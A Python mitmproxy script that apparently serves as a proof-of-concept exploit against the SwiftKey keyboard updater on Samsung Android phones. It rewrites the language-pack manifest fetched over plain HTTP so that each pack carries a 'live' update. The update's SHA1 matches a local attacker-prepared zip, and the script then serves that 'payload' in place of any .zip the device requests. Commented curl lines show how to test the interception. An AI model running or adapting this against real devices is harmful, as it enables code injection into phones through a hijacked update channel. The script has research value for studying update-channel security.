import os
from libmproxy import proxy, flow
import copy
import json
import time
import re
from netlib import odict
import shutil
import zipfile
import urllib2

# To test the proxy :
# http_proxy=http://localhost:8080 curl -H "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G900V Build/KOT49H)" http://skslm.swiftkey.net/samsung/downloads/v1.3-USA/az_AZ.zip > az_AZ.zip

# http_proxy=http://localhost:8080 curl -H "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G900V Build/KOT49H)" http://skslm.swiftkey.net/samsung/downloads/v1.3-USA/languagePacks.json  | jq '.'

# http_proxy=http://localhost:8080 curl -H "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G900V Build/KOT49H)" http://skslm.swiftkey.net/live_update.zip > live_update.zip


liveZipUpdateName = "/tmp/test.zip"

def start(context, argv):
  global liveZipUpdateName
  global moddedManifest

  context.log("Grabbing original manifest")
  languagePackJSON = read_original_language_pack_manifest()
  live_sha1 = sha1OfFile(liveZipUpdateName)
  live_update = {}
  live_update['archive'] = "http://skslm.swiftkey.net/live_update.zip"
  live_update['sha1'] = live_sha1
  live_update['version'] = 8000

  for lp in languagePackJSON:
    lp['live'] =  live_update

  moddedManifest = languagePackJSON

def response(context, flow):
    global moddedManifest
    global liveZipUpdateName

    flow.response.headers["ETag"] = []
    flow.response.headers["Via"] = []
    flow.response.headers["Last-Modified"] = []
    flow.response.headers["X-Amz-Cf-Id"] = []
    flow.response.headers["Age"] = []
    flow.response.headers["Cache-Control"] = []
    flow.response.headers["Date"] = []
    flow.response.headers["X-Cache"] = []
    flow.response.headers["x-amz-meta-s3cmd-attrs"] = []

    if(flow.request.headers['Host'] == ["skslm.swiftkey.net"] and \
       flow.request.path.startswith("/samsung/downloads/")  and \
       flow.request.path.endswith("languagePacks.json")):


       flow.response.code = 200
       flow.response.content = json.dumps(moddedManifest)

    elif flow.request.headers['Host'] == ["skslm.swiftkey.net"] \
     and flow.request.path.endswith(".zip"):
      context.log("Serving payload")
      z = open(liveZipUpdateName, "r")
      moddedZip = z.read()
      z.close()
      flow.response.code = 200
      flow.response.content = moddedZip
      flow.response.headers['Content-Length'] = [str(len(moddedZip))]
      flow.response.headers['Content-Type'] = ["application/zip"]

def create_dir_if_not_exists(f):
  if not os.path.exists(f):
    os.makedirs(f)

def sha1OfFile(filepath):
    import hashlib
    with open(filepath, 'rb') as f:
        return hashlib.sha1(f.read()).hexdigest()

def read_original_language_pack_manifest():
  request = urllib2.urlopen("http://skslm.swiftkey.net/samsung/downloads/v1.5-USA/languagePacks.json")
  return json.loads(request.read())
